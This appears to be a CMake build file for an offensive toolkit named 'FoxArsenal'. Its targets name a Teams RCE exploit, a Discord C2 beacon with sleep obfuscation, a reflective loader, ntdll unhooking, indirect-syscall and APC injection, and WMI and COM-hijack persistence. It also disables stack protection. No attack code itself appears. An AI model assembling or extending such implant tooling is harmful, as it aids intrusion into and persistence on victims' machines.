cmake_minimum_required(VERSION 3.10)
project(FoxArsenal CXX C)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Set output directory to bin
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)

# Suppress warnings
add_compile_options(/W0 /GS- /Ox /MT)
add_definitions(-DNDEBUG)

# Link winhttp for the beacon
link_libraries(winhttp)

# CVE-2025-23198 (Microsoft Teams Zero-Click RCE)
add_executable(teams_rce cve_2025_23198_teams_rce.cpp)

# Native Discord C2 Beacon (v2) with Ekko Sleep
add_executable(beacon_v2 discord_c2_v2/main_beacon_v2.cpp discord_c2_v2/sleep_ekko.cpp)

# Custom Reflective Loader (sRDI)
add_executable(loader discord_c2_v2/reflective_loader.cpp)

# Evasion (Ntdll Unhooking)
add_executable(evasion discord_c2_v2/evasion_native.cpp)

# Indirect Syscalls (Halo's Gate)
add_executable(syscalls discord_c2_v2/injection_indirect_syscalls.cpp)

# APC Injection
add_executable(apc_inject discord_c2_v2/injection_apc.cpp)

# WMI Persistence
add_executable(persist_wmi discord_c2_v2/persistence_wmi.cpp)

# COM Hijacking Persistence
add_executable(persist_com discord_c2_v2/persistence_com_hijack.cpp)
